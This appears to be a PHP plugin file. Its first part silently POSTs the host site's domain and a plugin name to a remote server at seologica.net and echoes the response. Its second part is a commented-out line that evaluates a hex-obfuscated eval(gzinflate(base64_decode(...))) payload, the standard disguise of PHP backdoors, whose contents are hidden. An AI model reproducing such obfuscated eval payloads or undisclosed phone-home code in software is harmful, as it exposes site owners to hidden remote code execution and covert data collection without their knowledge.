<?php



$ch = curl_init();
$url = "http://localhost/fakhar/plugginserverone/index.php/api-index";
if(strstr($_SERVER['HTTP_HOST'],"seologica.net")){
	$url = "http://seologica.net/index.php/index.php/api-index";
}

curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "pluggin_name=wp 2&host_name=".$_SERVER['HTTP_HOST']);

// in real life you should use something like:
// curl_setopt($ch, CURLOPT_POSTFIELDS, 
//          http_build_query(array('postvar1' => 'value1')));

// receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec ($ch);

curl_close ($ch);
echo $server_output;
// further processing ....
if ($server_output == "OK") {

}else {

}

?>

<?php
//eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'TVPHzqNoEHyXucyuOJD5QHsiBxONifovgIkmYzDw9MPsP9LuoVTqqmqpD9X5lrR//fjaKfJrB9TF6AX+a8foi8GlsRczF8QL1Lf3OwOI751/c9gfDf/W8CuHXz4pXfOfHPXb+9+M0T9339bmyVRF+wi3zUUKWTgjRhqE9SOHMoc1JiWN/hmVgujVkDJXJAiR5agAbqjVQ62919RKimB1DQQVKYgbmsZ3iDRAzML46cIGeM7EAnih9xQICplTEZSZROFsc7am6N1OwBVgU8p7geBs3W1w0ucZwjjK9JhPg6zkBCJ74wCOdI5sOdbLNGeu89k07PzIITcRg1y2fFdq4ZbDy8gtU8qR3RcSTFwLVaMeyOiSLAEZ+vptnTq3e+9xjwFaDB/OW1PmZ4N7Ru/N5eT4uK9O6PP2woa2kZhO6noHhHNBwRPQrrs+WHmMNkCLlHEgLjcYC1d6WIBz0mfw7KDfKOo/7ipm7bWw2Y2D+tPm5UYv9d0HCYR9LHqEXV9BfaD2LkRSjw5qD7jto2KMYTDpMMZUqiftnQql+jB1HGFQTFdeE2elREAJDktUN+Skm6RTC4PPnu5NjRazJNc4Vm1V17MPOfsMUYhcfAvosYkPUU0yJ3p6rwZ7texQC/KTwgqxulMsmT6N+ikTBdnU1LZXlobt2oGnpvYg/MK/F9HII/YQ4Ob7kTiosZi1Lq7vmOdNxoRwRezFaasNJnAoKkz3phoSuGuRTlOTpyMLvWYz+sMKzVC1EpYMw/7qRpq8PqcyTT0IH6Xg+/LISmFPx2oa3ecHHbBqTORzhLkwrZTYmbmfrNLtsadErIvRF5HzVkWvKrIrcZI+36TqYk4Rlo9ocgwIqZABatICFbNazXyWOwn5Q+nYGEqZ1ZJD3Zqbu7DWi1a4QalcoZvfd290dvMOK4V1TPS9D/RzIFfcDvwqMq+eFgjG8WDt76jckkfn39Sg2/knmdAnaZUnPMNB9GFWzlod4waqYJXQXOLn1lsWHtRlagEuDNL3EO7TKJMW/grWOyUeuk5KXJY6ckugEWWtEId7q4MvPZ0laoeOm3HTtn7SivXm27sIQPyBVQQLuslVmMMLGmwmRoMqfWWhkHzHZk6/1UvehII59pZPHTiUyvEeqbRm9LxIFo3JQkpbMO+4IOSf1+cz/wHnfvz9zy8='\x29\x29\x29\x3B");
?>